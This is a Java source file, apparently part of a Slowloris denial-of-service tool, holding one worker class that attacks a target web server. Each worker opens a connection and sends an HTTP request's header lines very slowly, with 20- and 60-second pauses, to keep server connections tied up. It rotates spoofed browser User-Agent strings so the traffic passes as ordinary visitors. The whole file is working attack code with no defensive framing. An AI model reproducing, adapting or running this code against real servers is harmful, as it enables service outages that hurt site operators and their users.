package io.github.slowloris.http;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.Random;
import java.util.concurrent.Callable;

import io.github.slowloris.domain.SocketStatus;
import io.github.slowloris.domain.Target;
import io.github.slowloris.domain.WorkerAction;
import io.github.slowloris.domain.WorkerStatus;
import io.github.slowloris.event.Broadcaster;

public class SlowHttpRequest implements Callable<Void> {

        private int threadId;
        private Target target;		
        private Socket socket;
        
        private WorkerStatus status = new WorkerStatus();
        private Broadcaster broadcaster;
        
        private final String[] REQUESTS = {
          "GET %s HTTP/1.0\r\n",
          "Host: %s\r\n",
          "User-Agent: %s\r\n",
          "Connection: %s\r\n"
        };
        
        private final String[] USER_AGENTS = {
          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
          "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
          "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
          "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
          "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
          "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
          "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
          "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
          "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
          "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
          "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
          "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
          "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
          "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0"
        };
        
        /**
         * 
         * @param target
         * @param threadId
         */
        public SlowHttpRequest(Target target, int threadId, Broadcaster broadcaster) {
                this.target = target;
                this.threadId = threadId;
                
                this.broadcaster = broadcaster;
                
                status.setId(this.threadId);
                status.setDomain(target.getDomain());
                status.setPort(target.getPort());
        }
                
        @Override
        public Void call() throws Exception {
                try {			
                        
                        socket = new Socket(target.getIp(), target.getPort());
                        PrintWriter writer = new PrintWriter(socket.getOutputStream());
                        Random rand = new Random();
                        
                        status.setAction(WorkerAction.UPDATE);
                        status.setSocketStatus(SocketStatus.CONNECTED);
                        status.setDescription(SocketStatus.CONNECTED.toString());
                        broadcaster.broadcastWorkerStatus(status);
                        
                        String[] params = {
                            String.format(REQUESTS[0], target.getPath()),
                            String.format(REQUESTS[1], target.getDomain()),
                            String.format(REQUESTS[2], USER_AGENTS[rand.nextInt(24)]),
                            String.format(REQUESTS[3], "Keep-Alive"),
                        };
                        
                        for (int i = 0, size = params.length; i < size; i++) {
                                writer.write(params[i]);
                                status.setCurrentRequest(params[i]);
                                broadcaster.broadcastWorkerStatus(status);
                                
                                int timeout = i == params.length - 1 ? 60000 : 20000;
                                Thread.sleep(timeout);
                        }
                                                
                        socket.close();
                                                                
                } catch (IOException e) {
                        e.printStackTrace(System.out);
                        
                } catch (InterruptedException e) {
                        e.printStackTrace(System.out);
                }
                
                status.setDescription(SocketStatus.DISCONNECTED.toString());
                status.setSocketStatus(SocketStatus.DISCONNECTED);
                broadcaster.broadcastWorkerStatus(status);
                
                Thread.sleep(5000);
                
                return null;
        }

        /**
         * 
         * @return
         */
        public int getThreadId() {
                return threadId;
        }
}
